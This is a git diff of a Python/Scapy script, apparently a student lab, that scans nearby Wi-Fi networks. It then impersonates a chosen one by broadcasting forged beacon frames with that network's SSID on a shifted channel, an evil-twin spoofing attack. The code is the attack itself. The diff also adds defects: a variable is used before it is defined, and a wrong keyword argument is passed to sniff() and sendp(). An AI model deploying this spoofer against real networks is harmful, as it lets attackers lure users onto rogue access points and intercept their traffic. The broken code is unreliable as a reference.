@@ -1,31 +1,32 @@
+#Auteurs : Peguiron Adrien, Viotti Nicolas
 from scapy.all import *
 from threading import Thread
 import pandas
 import time
 import os
 
-iface = 'wlan0'         #Interface name here
-# fortement inspiré de https://www.thepythoncode.com/code/building-wifi-scanner-in-python-scapy
-# initialize the networks dataframe that will contain all access points nearby
+IFACE = 'wlan0'         # Nom de l'interface ici
+# Fortement inspiré de https://www.thepythoncode.com/code/building-wifi-scanner-in-python-scapy
+# Initialise le dataframe des réseaux qui contiendra tous les access points aux alentours
 networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel"])
-# set the index BSSID (MAC address of the AP)
+# Set l'index BSSID (adresse MAC de l'access point)
 networks.set_index("BSSID", inplace=True)
 isScanning = True
 isPrinting = True
 
 def callback(packet):
     if packet.haslayer(Dot11Beacon):
-        # extract the MAC address of the network
+        # Extrait l'adresse MAC du réseau
         bssid = packet[Dot11].addr2
-        # get the name of it
+        # Récupère le SSID du réseau
         ssid = packet[Dot11Elt].info.decode()
         try:
             dbm_signal = packet.dBm_AntSignal
         except:
             dbm_signal = "N/A"
-        # extract network stats
+        # Extrait les stats du réseau
         stats = packet[Dot11Beacon].network_stats()
-        # get the channel of the AP
+        # Récupère le canal de l'access point
         channel = stats.get("channel")
         networks.loc[bssid] = (ssid, dbm_signal, channel)
 
@@ -40,35 +41,38 @@ def print_all():
 def change_channel():
     ch = 1
     while isScanning:
-        os.system(f"iwconfig {iface} channel {ch}")
-        # switch channel from 1 to 14 each 0.5s
+        os.system(f"iwconfig {IFACE} channel {ch}")
+        # Change de canal de 1 à 14 toutes les 0.5 secondes
         ch = ch % 14 + 1
         time.sleep(0.5)
 
 
 if __name__ == "__main__":
-    # start the thread that prints all the networks
+    # Démarre le thread qui print tous les réseaux
     printer = Thread(target=print_all)
     printer.daemon = True
     printer.start()
-    # start the channel changer
+    # Démarre l'échangeur de canal (Canal += 6)
     channel_changer = Thread(target=change_channel)
     channel_changer.daemon = True
     channel_changer.start()
-    # start sniffing
-    sniff(prn=callback, iface=iface, timeout=10)
-    # on arrête de scanner et d'afficher les SSID dispos et on arrête les threads
+    # Démarre le sniffing
+    sniff(prn=callback, IFACE=IFACE, timeout=10)
+    # On arrête de scanner et d'afficher les SSID dispos et on arrête les threads
     isPrinting = False
     isScanning = False
     printer.join()
     channel_changer.join()
 
-    netSSID = input("Entrez le nom du wifi à usurper, il doit correspondre à un wifi existant : ")  # Network name here
-    network = networks.loc[networks['SSID'] == netSSID]
+    while network.empty:
+        netSSID = input("Entrez le nom du wifi à usurper, il doit correspondre à un wifi existant : ")  # Network name here
+        network = networks.loc[networks['SSID'] == netSSID]
+
     # positionnement 6 channels plus loin
     evilChannel = (network['Channel'] + 6) % 14
-    os.system(f"iwconfig {iface} channel {evilChannel[0]}")
-# inspiré de https://www.4armed.com/blog/forging-wifi-beacon-frames-using-scapy/
+    os.system(f"iwconfig {IFACE} channel {evilChannel[0]}")
+
+# Inspiré de https://www.4armed.com/blog/forging-wifi-beacon-frames-using-scapy/
     dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff',
                   addr2='22:22:22:22:22:22', addr3='33:33:33:33:33:33')
     beacon = Dot11Beacon(cap='ESS+privacy')
@@ -85,5 +89,5 @@ if __name__ == "__main__":
 
     frame = RadioTap() / dot11 / beacon / essid / rsn
 
-# envoie des trames
-    sendp(frame, iface=iface, inter=0.100, loop=1)
+# Envoi des trames
+    sendp(frame, IFACE=IFACE, inter=0.100, loop=1)
